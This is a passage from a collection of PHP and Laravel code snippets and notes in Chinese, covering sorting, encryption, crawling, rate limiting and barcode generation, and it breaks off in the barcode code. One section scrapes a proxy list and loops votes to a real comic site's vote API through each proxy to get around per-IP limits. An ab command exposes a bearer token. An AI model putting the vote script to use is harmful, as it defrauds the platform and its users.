字节转换123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120/** * 转化内存信息https://github.com/yiranzai/php-tools * @param $bytes * @param bool $binaryPrefix * @return string */ public static function getNiceFileSize(int $bytes, bool $binaryPrefix = true): string &#123; if ($binaryPrefix) &#123; $unit = array('B', 'KiB', 'MiB', 'GiB', 'TiB', 'PiB'); if ($bytes === 0) &#123; return '0 ' . $unit[0]; &#125; return @round($bytes / (1024 ** ($i = floor(log($bytes, 1024)))), 2) . ' ' . ($unit[(int)$i] ?? 'B'); &#125; $unit = array('B', 'KB', 'MB', 'GB', 'TB', 'PB'); if ($bytes === 0) &#123; return '0 ' . $unit[0]; &#125; return @round($bytes / (1000 ** ($i = floor(log($bytes, 1000)))), 2) . ' ' . ($unit[(int)$i] ?? 'B'); &#125; /** * 四舍五入 格式化除法 * @param $divisor * @param $divided * @param int $scale * @return int|string */ public static function formatDiv($divisor, $divided, int $scale = 2) &#123; if (empty((int)$divided)) &#123; return sprintf('%.' . $scale . 'f', 0); &#125; return $scale === 0 ? bcdiv($divisor, $divided) : sprintf('%.' . $scale . 'f', bcdiv($divisor, $divided, $scale + 1)); &#125; /** * 求两个数的最大公约数 * * @param $a * @param $b * @return int */ public static function gcd(int $a, int $b): int &#123; if ($a === 0 || $b === 0) &#123; return abs(max(abs($a), abs($b))); &#125; $r = $a % $b; return ($r !== 0) ? self::gcd($b, $r) : abs($b); &#125; /** * 求一个数组的最大公约数 * * @param array $array * @param int $a * @return int */ public static function gcdArray(array $array, $a = 0): int &#123; $b = array_pop($array); return ($b === null) ? (int)$a : self::gcdArray($array, self::gcd($a, $b)); &#125; /** * 每次都取中间的那个数，遍历数组，比它大放右边，比它小放左边 快速排序 * * @param array $array * @return array */ public static function quickSort(array $array): array &#123; $len = count($array); if ($len &lt;= 1) &#123; return $array; &#125; $m = $len &gt;&gt; 1;//取中间值 50&gt;&gt;1 25 51&gt;&gt;1 25 52&gt;&gt;1 26 $mValue = $array[$m]; $left = $right = []; foreach ($array as $key =&gt; $iValue) &#123; if ($key === $m) &#123; continue; &#125; if ($iValue &lt; $mValue) &#123; $left[] = $iValue; &#125; else &#123; $right[] = $iValue; &#125; &#125; return array_merge(self::quickSort($left), [$mValue], self::quickSort($right)); &#125; public static function quick($arr)&#123; if(count($arr)&lt;=1)&#123; //如果数组根本就一个元素就直接返回 不用在排序咯 return $arr; &#125; $k=$arr[0];//定义一个初始要排序的值 默认为数组第一个 $x=array();//定义比要排序的值 小的数组块 $y=array();//定义比要排序的值 大的数组块 $_size=count($arr);//统计数组的大小 for($i=1;$i&lt;$_size;$i++)&#123;//循环数组 记住这边要从索引1 开始 if($arr[$i]&lt;=$k)&#123;//如果当前的值小于 要排序的值 $x[]=$arr[$i];//就把小于的值放到 小的数组块中 &#125;elseif($arr[$i]&gt;$k)&#123;//如果当前的值大于 要排序的值 $y[]=$arr[$i];//就把大于的值放到 大的数组块中 &#125; &#125; $x=Sort::quick($x);//依次递归执行 这样就会得到小的数组块 $y=Sort::quick($y);//依次递归执行 这样就会得到大的数组块 return array_merge($x,array($k),$y);//最后在合并下 小的模块+中间的模块【初始要排序的值】+大的模块 就ok~ &#125; php多线程12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// 继承 Thread 的类具有创建线程的能力class Request extends Thread&#123; private $sql; private $dsn; public function __construct($sql, $dsn) &#123; $this-&gt;sql = $sql; $this-&gt;dsn = $dsn; &#125; public function run() &#123; $db = new PDO($this-&gt;dsn); $stat1 = $db-&gt;query($this-&gt;sql); $result = $stat1-&gt;fetchAll(PDO::FETCH_ASSOC); print_r($result); &#125;&#125;$dsn = 'sqlite:/tmp/pselect.db';$db = new PDO($dsn);$db-&gt;exec('create table users(id int, name varchar(255))');$db-&gt;exec('create table books(id int, name varchar(255))');//$db-&gt;exec("insert into users(id, name) values(1, '张三')");//$db-&gt;exec("insert into users(id, name) values(2, '李四')");//$db-&gt;exec("insert into books(id, name) values(1, '三国')");//$db-&gt;exec("insert into books(id, name) values(2, '水浒')");$sql = [ 'select * from users', 'select * from books',];//$stat1 = $db-&gt;query($sql[0]);//$stat2 = $db-&gt;query($sql[1]);//$results1 = $stat1-&gt;fetchAll(PDO::FETCH_ASSOC);//$results2 = $stat2-&gt;fetchAll(PDO::FETCH_ASSOC);//print_r($results1);//print_r($results2);$arr = [];for ($i = 0; $i &lt; 2; $i++) &#123; $request = new Request($sql[$i], $dsn); $arr[$i] = $request; // 创建新线程，随后线程会执行 run 方法 if (! $request-&gt;start()) &#123; die("Start thread failed\n"); &#125; echo "Thread(&#123;$i&#125;) started\n";&#125;for ($i = 0; $i &lt; 2; $i++) &#123; // join 是阻塞的，所以脚本运行时间取决于耗时最长的线程 if (! $arr[$i]-&gt;join()) &#123; die("Join failed\n"); &#125;&#125;https://learnku.com/articles/26812public static function select($array)&#123; $count=count($array);//取出数组的总长度 for($i=0;$i&lt;$count-1;$i++)&#123;//外部循环 依次循环 /* 找出最小的元素 开始*/ $min=$i;//查找到最低的元素 for($j=$i+1;$j&lt;$count;$j++)&#123; //由小到大排列 if($array[$min]&gt;$array[$j])&#123;//如果当前的元素比后面的元素大 $min=$j;//就把最小的元素指针替换成后面元素 &#125; &#125; /* 找出最小的元素 结束*/选择排序 /*swap$array[$i]and$array[$min]即将当前内循环的最小元素放在$i位置上*/ if($min!=$i)&#123;//如果找出的最小的元素不在当前的循环的索引位置 $temp=$array[$min];//当前元素存储临时变量 $array[$min]=$array[$i];//把最小位置上的元素替换成当前的元素 $array[$i]=$temp;//把当前的元素替换成最小的元素 &#125; &#125; return $array; &#125;//模式分隔符后的"i"标记这是一个大小写不敏感的搜索if (preg_match("/php/i", "PHP is the web scripting language of choice.")) &#123; echo "查找到匹配的字符串 php。";&#125; else &#123; echo "未发现匹配的字符串 php。";&#125; 大文件传输解决方案1234567891011121314151617181920212223242526272829303132333435public function sliceDownload() &#123; $path = 'slice/'.date('Ymd') ; $filename = $path .'/'. '周杰伦 - 黑色幽默 [mqms2].mp3' ; //获取文件资源https://learnku.com/articles/31108 $file = Storage::disk('admin')-&gt;readStream($filename); //获取文件大小 $fileSize = Storage::disk('admin')-&gt;size($filename); header("Content-type:application/octet-stream");//设定header头为下载 header("Accept-Ranges:bytes"); header("Accept-Length:".$fileSize);//响应大小 header("Content-Disposition: attachment; filename=周杰伦 - 黑色幽默 [mqms2].mp3");//文件名 //不设置的话要等缓冲区满之后才会响应 ob_end_clean();//缓冲区结束 ob_implicit_flush();//强制每当有输出的时候,即刻把输出发送到浏览器\ header('X-Accel-Buffering: no'); // 不缓冲数据 $limit=1024*1024; $count=0; //限制每秒的速率 while($fileSize-$count&gt;0)&#123;//循环读取文件数据 $data=fread($file,$limit); $count+=$limit; echo $data;//输出文件 sleep(1); &#125; &#125; PHP 生成奖状1234567891011121314151617ob_clean();$realname = "姓名:最闲的码农";$schoolname = "社区:Laravel"; $image = imagecreatefrompng('1562926506930.png'); //书模版图片文件的路径 必须是png格式的文件$red = imagecolorallocate($image,00,00,00); // 字体颜色// imageTTFText("Image", "Font Size", "Rotate Text", "Left Position","Top Position", "Font Color", "Font Name", "Text To Print");//根据文本填写的位置不同https://learnku.com/articles/31120//"Left Position 和 Top Position 可以使用 getimagesize进行配合计算文字x和y轴坐标imageTTFText($image, 50, 0, 628, 615, $red, 'simheittf.ttf',$realname);imageTTFText($image, 50, 0, 628, 714, $red, 'simheittf.ttf', $schoolname);header('Content-type: image/png;');ImagePng($image);imagedestroy($image);$filename = 'certificate_aadarsh.png';ImagePng($image, $filename);imagedestroy($image); Composer install 报错1234567891011Finished: success: 62, skipped: 0, failure: 0, total: 62Package operations: 62 installs, 0 updates, 0 removals - Installing kylekatarnls/update-helper (1.1.1): Loading from cachePlugin installation failed, rolling back - Removing kylekatarnls/update-helper (1.1.1) [RuntimeException] Could not delete /home/vagrant/code/w2_support-/vendor/kylekatarnls/update-helper/src/ UpdateHelper: composer install --no-plugins 我的问题解决了.!https://learnku.com/laravel/t/31137 PHP-FPM 与 Nginx 的通信机制总结12345678910111213141516171819202122PHP-FPM 即 PHP-FastCGI Process Manager， 它是 FastCGI 的实现，并提供了进程管理的功能。进程包含 master 进程和 worker 进程两种；master 进程只有一个，负责监听端口，接收来自服务器的请求，而 worker 进程则一般有多个（具体数量根据实际需要进行配置），每个进程内部都会嵌入一个 PHP 解释器，是代码真正执行的地方https://learnku.com/articles/23694 www.test.com | | Nginx | |路由到 www.test.com/index.php | |加载 nginx 的 fast-cgi 模块 | |fast-cgi 监听 127.0.0.1:9000 地址 | |www.test.com/index.php 请求到达 127.0.0.1:9000 | | 等待处理... Laravel 报错：PHP Fatal error: Uncaught ReflectionException: Class request does not exist1234在 App\Exceptions\Handler::report() 方法里，使用：dd($exception);即可打印更详细的报错信息，知道问题在哪https://learnku.com/laravel/t/31178 JSON 响应出现浮点小数溢出12345调整 php.ini 中 serialize_precision (序列化精度) 的大小来解决这个问题。默认值 serialize_precision = -1将这个值改为 小于 17 的数字就解决了这个问题，最后一直往小调，我 14 的时候就没有问题了https://wiki.php.net/rfc/precise_float_value https://learnku.com/articles/31194 原码、反码、补码1234567891011121314151617181920212223242526272829303132333435363738394041正数的原码、反码、补码都一样负数的反码 = 它的原码符号位不变，其他取反（0-&gt;1 , 1-&gt;0）负数的补码 = 它的反码 + 1 1 ==&gt; 原码 [0000 0001] 反码[0000 0001] 补码[0000 0001]-1 ==&gt; 原码 [1000 0001] 反码[1111 1110] 补码[1111 1111]0 的反码，补码都是 0在计算机运算的时候，都是以补码的方式来计算的1+1 1-1 = 1+（-1）按位与 &amp; ： 两位全为１，结果为 1，否则为 0按位或 | : 两位有一个为 1，结果为 1，否则为 0按位异或 ^ : 两位一个为 0, 一个为 1，结果为 1，否则为 0//2&amp;3//2的补码 0000 0010//3的补码 0000 0011//2&amp;3 0000 0010 =&gt;2//2|3 0000 0011 =&gt;3//2^3 0000 0001 =&gt;1//-2^2//-2的原码 1000 0010//-2的反码 1111 1101//-2的补码 1111 1110//2 的补码 0000 0010//-2^2//-2的补码 1111 1110//2 的补码 0000 0010//-2^2 1111 1100 （补码）//-2^2 1111 1011 （反码）//-2^2 1000 0100 （原码） =&gt; 4https://learnku.com/articles/31179 APP_KEY123456789101112131415161718192021222324252627282930313233343536373839404142434445464748只有一个地方会用到 APP_KEY：cookies。Laravel 使用它来加密所有的 cookies，在将 cookie 返回给用户之前 Laravel 会对 cookie 进行加密，然后再返回给用户，这样客户端就无法自己修改 cookie 来伪装成管理员或者其他用户了。所以的加密和解密都在 [Encrypter](https://learnku.com/docs/laravel/master/encryption#using-the-encrypter) 中进行处理，其中主要使用了 [openssl_encrypt](https://secure.php.net/manual/en/function.openssl-encrypt.php) 进行加密。有很多用户都会有一个误解，那就是 APP_KEY 是用来处理用户哈希密码的。事实上不是这样的。Laravel 的密码使用了 Hash::make() 或者 bcrypt() 来进行哈希处理，其中并没有用到 APP_KEY在 Laravel 中有两个主要的加密 Facade，分别是 Crypt（对称加密） 和 Hash（单向加密哈希）。密码是哈希，而 cookie 则是对称加密。$key = "dont-panic";$message = "So long and thanks for all the fish";$key = "dont-panic";$cipher = "AES-256-CBC";echo openssl_encrypt($message, $cipher, $key);// JJEK8L4G3BCfY0evXDRxUke2zqAzq6i7wL/Px4SjaEHXqt3x7hsj4+PhVQaH4ujX$secret = "JJEK8L4G3BCfY0evXDRxUke2zqAzq6i7wL/Px4SjaEHXqt3x7hsj4+PhVQaH4ujX";$key = "dont-panic";$cipher = "AES-256-CBC";echo openssl_decrypt($secret, $cipher, $key);// So long and thanks for all the fishLaravel 中使用了 PHP 的原生方法 password_hash()，它使用的哈希算法叫 bcrypt。use Illuminate\Support\Facades\Hash;$password = "dont-panic";echo Hash::make($password);// $2y$10$hEEF0lv4spxnvw5O4XyLZ.QjCE1tCu8HjMpWhmCS89J0EcSW0XELu$hash = '$2y$10$hEEF0lv4spxnvw5O4XyLZ.QjCE1tCu8HjMpWhmCS89J0EcSW0XELu';return Hash::check($input, $hash); https://learnku.com/articles/31169// 加密算法1. $encryptMethod = 'aes-256-cbc';// 明文数据2. $data = 'Hello World';// 生成IV3. $ivLength = openssl_cipher_iv_length($encryptMethod);4. $iv = openssl_random_pseudo_bytes($ivLength, $isStrong);5. if (false === $iv &amp;&amp; false === $isStrong) &#123;6. die('IV generate failed');7. &#125;// 加密8. $encrypted = openssl_encrypt($data, $encryptMethod, 'secret', 0, $iv);// 解密9. $decrypted = openssl_decrypt($encrypted, $encryptMethod, 'secret', 0, $iv); PHP 识别相片12345678910111213141516PHP 识别相片是否是颠倒的，并且重新摆正相片https://learnku.com/articles/31235$image = imagecreatefromstring(file_get_contents($_FILES['image_upload']['tmp_name']));$exif = exif_read_data($_FILES['image_upload']['tmp_name']);if(!empty($exif['Orientation'])) &#123; switch($exif['Orientation']) &#123; case 8: $image = imagerotate($image,90,0); break; case 3: $image = imagerotate($image,180,0); break; case 6: $image = imagerotate($image,-90,0); break; &#125;&#125; Composer 镜像限额，出现要求用户名认证1234从 GitHub 下载 Zip 代码包而不是 CDN：https://learnku.com/articles/30415$ composer install --prefer-source不要在框架的 composer.json 里写死了源 AB 压测123456789101112131415161718192021ab -c 20 -t 10 -k -T "application/json" -H "Authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvd3d3LnpoemhlLmNvbSIsImlhdCI6MTU2MzE4MjA1OCwiZXhwIjoxNTY2MzM1NjU5LCJuYmYiOjE1NjMxODIwNTksImp0aSI6IlRiYXR5amhpMGJ6eHRNeEciLCJzdWIiOjEsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.PV-S7b_fbSPgtAk-6r-cDqGkoFL-UOsGJWVfQUV6p5E" http://ys.test/api/articleshttps://learnku.com/laravel/t/31291 public function handle($request, Closure $next, $maxAttempts = 60, $decayMinutes = 1) &#123; $key = $this-&gt;resolveRequestSignature($request); $maxAttempts = $this-&gt;resolveMaxAttempts($request, $maxAttempts); if ($this-&gt;limiter-&gt;tooManyAttempts($key, $maxAttempts)) &#123; throw $this-&gt;buildException($key, $maxAttempts); &#125; $this-&gt;limiter-&gt;hit($key, $decayMinutes); $response = $next($request); return $this-&gt;addHeaders( $response, $maxAttempts, $this-&gt;calculateRemainingAttempts($key, $maxAttempts) ); &#125;ThrottleRequests 中间件中 60和1 的意思是一分钟限制 60 次。 把客户端请求的请求源 ip 啥的，加密成 1 个 key（代表一个独立的请求对象），存储在缓存中，如果一分钟内超过这个限制，那么服务器就抛出 429: Too Many Attempts.并且在头部回传两个个响应头: X-RateLimit-Limit（限制次数）, X-RateLimit-Remaining (剩下多少次) php爬虫框架Goutte12345678910111213141516171819202122232425262728293031323334353637383940composer require fabpot/goutteuse Goutte\Client;$client = new Client();使用request()方法发起页面请求// Go to the symfony.com website$crawler = $client-&gt;request('GET', 'https://www.symfony.com/blog/');该方法会返回一个Crawler对象(Symfony\Component\DomCrawler\Crawler).Goutte依赖Guzzle，如果要自己配置Guzzle参数的话你可以为Goutte创建一个Guzzle实例，下面我们要做一个60秒请求超时时间，并且无需验证ssl的设定:use Goutte\Client;use GuzzleHttp\Client as GuzzleClient;$goutteClient = new Client();$guzzleClient = new GuzzleClient(array( 'timeout' =&gt; 60, 'verify' =&gt; false, //官方example中没有这项,这个还是很必要的,不然在请求有些https站点的时候会出错,我已填坑));$goutteClient-&gt;setClient($guzzleClient);点击链接// Click on the "Security Advisories" link$link = $crawler-&gt;selectLink('Security Advisories')-&gt;link();$crawler = $client-&gt;click($link);提取数据// Get the latest post in this category and display the titles$crawler-&gt;filter('h2 &gt; a')-&gt;each(function ($node) &#123; print $node-&gt;text()."\n";&#125;);表单提交https://towait.com/blog/php-web-crawler-goutte/$crawler = $client-&gt;request('GET', 'https://github.com/');$crawler = $client-&gt;click($crawler-&gt;selectLink('Sign in')-&gt;link());$form = $crawler-&gt;selectButton('Sign in')-&gt;form();$crawler = $client-&gt;submit($form, array('login' =&gt; 'fabpot', 'password' =&gt; 'xxxxxx'));$crawler-&gt;filter('.flash-error')-&gt;each(function ($node) &#123; print $node-&gt;text()."\n";&#125;); 防恶意频繁提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/** * 获取和校验ip；同时防止短时间内多次提交 * * @notice ：弹出验证码，需要替换掉echo $echo_str 即可。 * @return string ：返回校验成功的ip */protected function getAndCheckIP()&#123; // 获取环境ip if (getenv("HTTP_CLIENT_IP") &amp;&amp; strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); else if (getenv("HTTP_X_FORWARDED_FOR") &amp;&amp; strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); else if (getenv("REMOTE_ADDR") &amp;&amp; strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); else if (isset($_SERVER['REMOTE_ADDR']) &amp;&amp; $_SERVER['REMOTE_ADDR'] &amp;&amp; strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR']; else $ip = "unknown"; // check 环境ip if (!$this-&gt;isWhiteList($ip)) &#123; $echo_str = "提交过于频繁,请稍后再试！"; // 构建ip的时间栈数据 if (!is_array($_SESSION[$ip])) &#123; $_SESSION[$ip] = array(); &#125; if (isset($_SESSION[$ip][0])) &#123; $_SESSION[$ip][] = time(); // session 保存时间为6小时。清理session $post_interval_first = time() - $_SESSION[$ip][0]; if ($post_interval_first &gt; 21600) &#123; $_SESSION[$ip] = array(); &#125; // 两次提交小于1s，禁止提交 $post_interval_pre = time() - $_SESSION[$ip][count($_SESSION[$ip]) - 3]; if ($post_interval_pre &lt; 1) &#123; echo $echo_str; exit; &#125;; // 您在10s内已经提交了3请求，禁止提交 $post_interval_third = time() - $_SESSION[$ip][count($_SESSION[$ip]) - 3]; if (isset($_SESSION[$ip][3]) &amp;&amp; ($post_interval_third &lt; 10)) &#123; echo $echo_str; exit; &#125; // 您在1分钟期间已经提交了5请求，禁止提交 $post_interval_fifth = time() - $_SESSION[$ip][count($_SESSION[$ip]) - 3]; if (isset($_SESSION[$ip][5]) &amp;&amp; ($post_interval_fifth &lt; 60)) &#123; echo $echo_str; exit; &#125; // 6小时内提交10次，禁止提交 if (isset($_SESSION[$ip][10])) &#123; echo $echo_str; exit; &#125; &#125; else &#123; $_SESSION[$ip][] = time(); &#125; &#125; return ($ip);&#125;/** * 检验是否存在于白名单中 * * @param $ip ：校验的ip * @return bool ：校验结果 */function isWhiteList($ip)&#123; /** * 内网ip默认全部存在于白名单中 */ if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))&#123; return true; &#125; // 是否在写死的whitelist 里面 return in_array($ip,$this-&gt;_WHTTE_LIST);&#125; Goutte爬取 IP 代理池12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function getProxyIPPool()&#123; $client = new Client(); $ipPoolUrl = 'https://proxy.coderbusy.com/'; $crawler = $client-&gt;request('GET', $ipPoolUrl); $ipArr = $crawler-&gt;filter('table')-&gt;filter('tr')-&gt;each(function ($tr, $i) &#123; return $tr-&gt;filter('td')-&gt;each(function ($td, $i) &#123; return trim($td-&gt;text()); &#125;); &#125;); $newArr = []; foreach ($ipArr as $key =&gt;$value)&#123; if ($key &gt;0)&#123; $newArr[$key-1] = $value[0].':'.$value[1];//这里就是 table 的第一列和第二列 &#125; &#125; $file = file_put_contents('ipPool.json', json_encode($newArr)); echo "更新代理 IP 尺完毕";&#125;[ "13.59.33.106:3128", "200.116.227.99:53281", "190.232.168.242:8080"]function voteByIP ($ip, $port) &#123; $post_data = array ("bookid" =&gt; "102428"); $ch = curl_init("http://jljapi.manhuadao.cn/Vote/vote"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_PROXY,$ip); curl_setopt($ch,CURLOPT_PROXYPORT,$port); curl_setopt ($ch, CURLOPT_TIMEOUT, 1200); $result = curl_exec($ch); print_r($result.PHP_EOL); curl_close($ch);&#125;$ipPoolArr = json_decode(file_get_contents('ipPool.json'));foreach ($ipPoolArr as $key=&gt;$proxyStr)&#123; $ip = $proxyArr[0]; $port = $proxyArr[1]; voteByIP($ip, $port)&#125;#!/bin/bashfor((i=1;i&lt;=99999999999999999999999999999999999999;i++)); do php autoVote.php //还可以执行其他的操作，例如 php getIPPool.php 来更新代理 IP 池 https://qimajiang.com/2017/11/18/%E4%BD%BF%E7%94%A8%20Goutte%E7%88%AC%E5%8F%96%E4%BB%A3%E7%90%86%20IP%20%E6%B1%A0/done 微软小冰接口的颜值检测12345678910111213$face = new \Hanson\Face\Foundation\Face();$result = $face-&gt;score-&gt;get('https://ws2.sinaimg.cn/large/685b97a1gy1fehkmbi6hvj20u00u07ab.jpg');/**https://github.com/HanSon/face[ 'score' =&gt; 6.8, 'text' =&gt; '哥们颜值才6.8分，一下让整体颜值从7.3跌到7.1ORZ', 'url' =&gt; 'http://mediaplatform.trafficmanager.cn/image/fetchimage?key='];**/ php-fpm max_children 优化1234567 ps -ylef --sort:rss 此命令可以查看当前服务器所有的进程以及占用内存，留意 RSS 那列就是占用的内存数 http://hanc.cc/index.php/archives/179/ S UID PID PPID C PRI NI RSS SZ WCHAN STIME TTY TIME CMD S root 2 0 0 80 0 0 0 kthrea May05 ? 00:00:00 [kthreadd]S finance 16670 16668 0 80 0 7424 91470 inet_c Jul16 ? 00:00:00 php-fpm: pool wwwS root 16668 1 0 80 0 8184 91470 ep_pol Jul16 ? 00:00:04 php-fpm: master process (/data0/opt/php55/etc/php-fpm.conf)S root 16677 1 0 80 0 8932 98194 ep_pol Jul16 ? 00:00:09 php-fpm: master process (/data0/opt/php7/etc/php-fpm.conf)S root 16714 1 0 80 0 11140 97479 ep_pol Jul16 ? 00:00:04 php-fpm: master process (/data0/opt/php54/etc/php-fpm.conf) 使用多个同一数据库驱动123456789101112131415161718192021222324252627282930313233新项目需要连接两个mysql数据库，然而却出现无论如何也查询不了第二个数据库的情况。经历了多次断点调试，google无止境搜索，询问印度阿三无果的情况下，也只能查看源码解决问题了。最终发现在laravel的ConnectionFactory类的createConnection方法中有这么一段protected function createConnection($driver, $connection, $database, $prefix = '', array $config = [])&#123; if ($this-&gt;container-&gt;bound($key = "db.connection.&#123;$driver&#125;")) &#123; return $this-&gt;container-&gt;make($key, [$connection, $database, $prefix, $config]); &#125; switch ($driver) &#123; case 'mysql': return new MySqlConnection($connection, $database, $prefix, $config); case 'pgsql': return new PostgresConnection($connection, $database, $prefix, $config); case 'sqlite': return new SQLiteConnection($connection, $database, $prefix, $config); case 'sqlsrv': return new SqlServerConnection($connection, $database, $prefix, $config); &#125; throw new InvalidArgumentException("Unsupported driver [$driver]");&#125;$this-&gt;container-&gt;bound($key = "db.connection.&#123;$driver&#125;") 通过driver去跟容器做了绑定，也就是当你有第二个一样driver的数据库时，调用 $this-&gt;container-&gt;make()方法也会同样返回第一个绑定的 connection，这样无论如何也只能查询第一个了。http://hanc.cc/index.php/archives/153/修改后if ($this-&gt;container-&gt;bound($key = "db.connection.&#123;$driver&#125;.&#123;$config['name']&#125;")) &#123; return $this-&gt;container-&gt;make($key, [$connection, $database, $prefix, $config]);&#125;通过传入connection自定义的名称，能够避免重复 PHP的MD5加密与JAVA的MD5加密不一致1234567891011121314151617android端正确的MD5加密代码public static String md5(byte[] source) &#123; try&#123; MessageDigest md = MessageDigest.getInstance("MD5"); md.update( source ); StringBuffer buf=new StringBuffer(); for(byte b:md.digest()) buf.append(String.format("%02x", b&amp;0xff) ); return buf.toString(); &#125;catch( Exception e )&#123; e.printStackTrace(); return null; &#125;&#125;从代码可以看出，这里传入的参数是byte[]，而不是String，这里就需要事先对需要加密的字符串转成字节，便用到一个方法getBytes(Charset.forName("UTF-8"))http://hanc.cc/index.php/archives/14/ 生成条形码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148composer require codeitnowin/barcodenamespace App\Http\Controllers;use Illuminate\Http\Request;use CodeItNow\BarcodeBundle\Utils\BarcodeGenerator;use CodeItNow\BarcodeBundle\Utils\QrCode;class BarCodeController extends Controller&#123; public function index() &#123; echo '&lt;p&gt;Example - QrCode&lt;/p&gt;'; $qrCode = new QrCode(); $qrCode -&gt;setText('https://www.php.net/manual/zh/') -&gt;setSize(300) -&gt;setPadding(10) -&gt;setErrorCorrection('high') -&gt;setForegroundColor(array('r' =&gt; 0, 'g' =&gt; 0, 'b' =&gt; 0, 'a' =&gt; 0)) -&gt;setBackgroundColor(array('r' =&gt; 255, 'g' =&gt; 255, 'b' =&gt; 255, 'a' =&gt; 0)) -&gt;setLabel('https://www.php.net/') -&gt;setLabelFontSize(16) -&gt;setImageType(QrCode::IMAGE_TYPE_PNG); echo '&lt;img src="data:' . $qrCode-&gt;getContentType() . ';base64,' . $qrCode-&gt;generate() . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Code128&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("0123456789"); $barcode-&gt;setType(BarcodeGenerator::Code128); $barcode-&gt;setScale(2); $barcode-&gt;setThickness(25); $barcode-&gt;setFontSize(10); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Code11&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("0123456789"); $barcode-&gt;setType(BarcodeGenerator::Code11); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Code39&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("0123456789"); $barcode-&gt;setType(BarcodeGenerator::Code39); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Code39Extended&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("0123456789"); $barcode-&gt;setType(BarcodeGenerator::Code39Extended); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Ean128&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("00123456789012345675"); $barcode-&gt;setType(BarcodeGenerator::Ean128); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Gs1128&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("00123456789012345675"); $barcode-&gt;setType(BarcodeGenerator::Gs1128); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Gs1128&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("4157707266014651802001012603068039000000006377069620171215"); $barcode-&gt;setType(BarcodeGenerator::Gs1128); $barcode-&gt;setNoLengthLimit(true); $barcode-&gt;setAllowsUnknownIdentifier(true); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; // i15为偶数 echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - I25&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("00123456789012345675"); $barcode-&gt;setType(BarcodeGenerator::I25); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Isbn&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("0012345678901"); $barcode-&gt;setType(BarcodeGenerator::Isbn); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Msi&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("0012345678901"); $barcode-&gt;setType(BarcodeGenerator::Msi); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Postnet&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("01234567890"); $barcode-&gt;setType(BarcodeGenerator::Postnet); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - S25&lt;/p&gt;'; $barcode = new BarcodeGenerator(); $barcode-&gt;setText("012345678901"); $barcode-&gt;setType(BarcodeGenerator::S25); $code = $barcode-&gt;generate(); echo '&lt;img src="data:image/png;base64,' . $code . '" /&gt;'; echo '&lt;hr&gt;'; echo '&lt;p&gt;Example - Upca&lt;/p&gt;'; $barcode = new BarcodeGenerator(); 